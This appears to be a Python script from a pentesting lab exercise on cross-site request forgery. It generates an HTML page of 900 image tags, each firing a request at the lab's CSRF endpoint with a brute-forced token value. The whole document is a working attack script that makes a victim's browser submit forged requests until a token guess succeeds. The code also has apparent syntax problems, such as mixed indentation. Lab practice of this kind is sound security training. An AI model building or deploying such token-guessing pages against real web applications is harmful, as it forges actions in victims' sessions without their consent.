const = "8976565367489387311"

source = open("csrf.html", "w")

source.write("<html><body>HAI")	

for i in range(10,100):
	for j in range(0,10):
                token = "http://pentesteracademylab.appspot.com/lab/webapp/csrf/5?ch5=3dfe45&token="+str(i)+const+str(j)
		img = "<img src=" +token+ " />"
		source.write(img)

source.write("</body></html>")
		
